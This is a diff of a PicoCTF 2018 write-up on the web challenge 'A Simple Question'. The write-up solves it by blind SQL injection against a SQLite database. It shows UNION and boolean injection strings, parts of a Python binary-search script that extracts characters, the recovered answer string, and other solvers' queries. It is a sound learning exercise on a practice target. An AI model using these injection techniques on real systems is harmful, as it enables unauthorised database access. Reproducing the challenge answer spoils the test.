@@ -4,7 +4,7 @@ This is a 650-point PicoCTF 2018 web exploitation problem. It had nearly 2000 so
 
 ### Problem Description
 
-There is a website running at `http://2018shell.picoctf.com:2644` (link)[http://2018shell.picoctf.com:2644]. Try to see if you can answer its question.
+There is a website running at `http://2018shell.picoctf.com:2644` ([link](http://2018shell.picoctf.com:2644)). Try to see if you can answer its question.
 
 Here's the site, and a sample query:
 
@@ -42,7 +42,7 @@ No doubt the ease of this tool is why there are so many successful flag submissi
 
 #### Manual Solution
 
-I want to go back and actually perform an automated blind SQL injection attack without the aid of the tool. Let's start by enumerating the database type.
+I wanted to go back and actually perform an automated blind SQL injection attack without the aid of the tool. I started by enumerating the database type.
 
 Here's some Python code to send a SQL injection to the site and return `True` or `False`:
 
@@ -86,11 +86,11 @@ To confirm that it's SQLite:
 True
 ```
 
-Next, I determine the number of columns in the `answers` table:
+Next, I determined the number of columns in the `answers` table:
 
 `print(submit_query("42' OR '1'='1' UNION SELECT NULL, NULL'"))`
 
-results in
+resulted in
 
 ```
 SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns
@@ -100,9 +100,9 @@ while
 
 `print(submit_query("42' OR '1'='1' UNION SELECT NULL'"))`
 
-results in `True`.
+resulted in `True`. So there is just one column in the `answers` table.
 
-Next I get the number of rows in the table:
+Next I got the number of rows in the `answers` table:
 ```
 <pre>SQL query: SELECT * FROM answers WHERE answer='42' OR '1'='1' LIMIT 0,1 --'
 </pre><h1>You are so close.</h1>
@@ -124,9 +124,9 @@ False
 True
 ```
 
-So there is just one row. (This is sort of redundant since I already knew that from `SQLMap`, but I am pretending I did not know.)
+So there is just one record in the `answers` table. (This approach is sort of redundant since I already knew that from `SQLMap`, but I am pretending I did not know for learning purposes.)
 
-Next, I want to extract the contents of the result. To do that, I need to know the length of the string held in the `answers` table, and then determine the value of each ASCII character in the table. To do so, I wrote a function to do a binary search, which is designed to take the name of some arbitrary function that returns a boolean value, and then repeatedly call that function with different input values until the search is complete. Here's my function:
+Next, I wanted to extract the contents of the result. To do that, I needed to know the length of the string held in the `answers` table, and then determine the value of each ASCII character in the table. To do so, I wrote a function to do a binary search, which is designed to take the name of some arbitrary function that returns a boolean value, and then repeatedly call that function with different input values until the search is complete. Here's my function:
 
 ```
 # The binary search function. Optionally takes an argument to pass to the function it's calling.
@@ -144,7 +144,7 @@ def binary_search(lower, upper, f, arg1=None):
 			return binary_search(lower, guess, f, arg1)
 ```
 
-With this function, I can determine the length of the string in the `answers` table:
+With this function, I could determine the length of the string in the `answers` table:
 
 ```
 def guess_greater_than_or_equal_to_string_length(guess, arg1=None, debug=False):
@@ -160,7 +160,7 @@ def get_answer_length():
   	return(answer_length)
 ```
 
-And I can determine the value of a specific ASCII character in the string stored in the `answers` table:
+And I could determine the value of a specific ASCII character in the string stored in the `answers` table:
 
 ```
 # Now I just need a true / false function that tests a letter.
@@ -180,7 +180,7 @@ def extract_letter(index, debug=False):
   return(chr(int(hex_letter,10)))
 ```
 
-That's enough to get the `answer` string from the database and then the flag:
+That was enough to get the `answer` string from the database and then the flag:
 
 ```
 answer_length = get_answer_length()
@@ -197,13 +197,15 @@ print(submit_query("41AndSixSixths", debug=True))
 ```
 ![./manual_flag.png](./manual_flag.png)
 
-Not bad! That was a useful learning exercise, and I am well on my way to enumerating a database with blind SQL injection using my own code. I believe I know a bit more about how `SQLMap` works now. [Here's](./)
+Not bad! That was a useful learning exercise, and I am well on my way to enumerating a database with blind SQL injection using my own code. I believe I know a bit more about how `SQLMap` works now. [Here's](./exploit-A-Simple-Question.py) the full exploit code.
 
 ### Comparison to Other Approaches
 
-This write-up is pretty much along the same lines as other solutions. [shiltemann](https://github.com/shiltemann/CTF-writeups-public/tree/master/PicoCTF_2018#web-exploitation-650-a-simple-question) goes from the fact that there's an input parameter called `answer` and just goes ahead and guesses it one letter at a time. He doesn't use a binary search, he just loops through all the possible letters.
+This write-up is pretty much along the same lines as other solutions, except for one improvement over the other approaches in the binary search, which was harder to implement but runs more efficiently. For the purposes of this problem, a linear search would probably have been the fastest solution simply because it requires less time to implement.
 
-[LiUHack] thought to check the source code of the web problem first, and indeed the source code is [available](http://2018shell.picoctf.com:2644/answer2.phps)! I also liked his recognition of a potential [type juggling](./https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf) vulnerability in the PHP code (apparently not easily exploitable since the canary, "41AndSixSixths", is not easy to guess and does not start with a zero). [tcode2k16](https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/web-exploitation/#a-simple-question) uses [GLOB](https://www.tutorialspoint.com/sqlite/sqlite_glob_clause.htm) in their SQL queries. [d4rkvaibhav](https://github.com/d4rkvaibhav/picoCTF-2018-Writeups/tree/master/WEB_EXPLOITATION/A%20SIMPLE%20QUESTION) uses a technique similar to [this one](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html) to get all the characters in the canary, and then unscrambles / capitalizes them. That solution requires a bit more guesswork than the others. [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/A%20Simple%20Question.md) uses the following query:
+[shiltemann](https://github.com/shiltemann/CTF-writeups-public/tree/master/PicoCTF_2018#web-exploitation-650-a-simple-question) goes from the fact that there's an input parameter called `answer` and just goes ahead and guesses it one letter at a time.
+
+[LiUHack](https://github.com/liuhack/writeups/blob/master/2018/picoCTF/A_simple_question/README.md) thought to check the source code of the web problem first, and indeed the source code is [available](http://2018shell.picoctf.com:2644/answer2.phps)! I also liked their recognition of a potential [type juggling](./https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf) vulnerability in the PHP code (apparently not easily exploitable since the canary, "41AndSixSixths", is not easy to guess and does not start with a zero). [tcode2k16](https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/web-exploitation/#a-simple-question) uses [GLOB](https://www.tutorialspoint.com/sqlite/sqlite_glob_clause.htm) in their SQL queries. [d4rkvaibhav](https://github.com/d4rkvaibhav/picoCTF-2018-Writeups/tree/master/WEB_EXPLOITATION/A%20SIMPLE%20QUESTION) uses a technique similar to [this one](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html) to get all the characters in the canary, and then unscrambles / capitalizes them. That solution requires a bit more guesswork than the others. [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/A%20Simple%20Question.md) uses the following query:
 
 ```
 q = "' union SELECT answer from answers where length(answer) = {} and answer like '{}%".format(guess)
